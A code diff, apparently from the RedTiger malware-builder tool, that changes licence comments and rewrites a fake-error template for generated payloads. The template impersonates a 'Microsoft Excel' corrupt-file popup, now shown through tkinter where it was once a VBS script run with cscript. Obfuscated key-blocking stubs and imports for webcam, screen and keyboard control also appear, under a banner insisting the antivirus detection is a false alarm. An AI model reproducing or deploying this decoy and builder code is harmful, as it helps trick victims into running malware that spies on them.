@@ -1,8 +1,12 @@
-# Copyright (c) RedTiger (https://redtiger.online/)
+# Copyright (c) RedTiger (https://redtiger.shop)
 # See the file 'LICENSE' for copying permission
 # ----------------------------------------------------------------------------------------------------------------------------------------------------------|
-# EN: - Do not touch or modify the code below. If there is an error, please contact the owner, but under no circumstances should you touch the code.
-# FR: - Ne pas toucher ni modifier le code ci-dessous. En cas d'erreur, veuillez contacter le propriétaire, mais en aucun cas vous ne devez toucher au code.
+# EN: 
+#     - Do not touch or modify the code below. If there is an error, please contact the owner, but under no circumstances should you touch the code.
+#     - Do not resell this tool, do not credit it to yours.
+# FR: 
+#     - Ne pas toucher ni modifier le code ci-dessous. En cas d'erreur, veuillez contacter le propriétaire, mais en aucun cas vous ne devez toucher au code.
+#     - Ne revendez pas ce tool, ne le créditez pas au vôtre.
 
 #    ╔════════════════════════════════════════════════════════════════════════════╗
 #    ║ ! File detected by the antivirus, but be aware that there is no backdoor ! ║
@@ -44,6 +48,7 @@ import cv2
 import pyautogui
 import keyboard
 import threading
+from tkinter import messagebox
 
 def B10ck_K3y(): pass
 def Unb10ck_K3y(): pass
@@ -1445,20 +1450,7 @@ while True:
 
 F4k33rr0r = r'''
 def F4k3_3rr0r():
-    file = "Error.vbs"
-    code = """
-    x=msgbox("The file is corrupt and cannot be opened.", 16, "Microsoft Excel")
-    """
-    try:
-        with open(file, "w") as filevbs:
-            filevbs.write(code)
-        Clear()
-        subprocess.run(["cscript", file], shell=True)
-        Clear()
-        os.remove(file)
-    except:
-        Clear()
-        pass
+    messagebox.showerror("Microsoft Excel", "The file is corrupt and cannot be opened.")
 '''
 
 # ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
